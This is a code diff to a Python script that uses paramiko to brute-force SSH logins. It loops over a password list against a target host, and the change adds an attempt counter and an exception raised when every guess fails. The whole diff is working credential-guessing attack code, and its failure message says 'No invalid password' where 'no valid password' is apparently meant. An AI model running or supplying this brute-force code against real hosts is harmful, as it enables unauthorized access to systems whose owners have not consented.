@@ -12,14 +12,16 @@ ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
 
 def bruteforce_ssh(target, username,  pwds):
+    cnt = 1
     for pwd in pwds:
         try:
             ssh.connect(target, username=username, password=pwd)
         except Exception as e:
+            cnt += 1
             continue
-        print(f"You have successfully connected to {target}!")
-        break
-    print(f"There is no valid password to access {target}!")
+        print(f"You have successfully connected to {target} at {cnt} attempts!")
+        return
+    raise Exception(f"No invalid password for {target}!!!")
 
 def main():
     if len(sys.argv) != EXPECTED_ARGUMENT_COUNT:
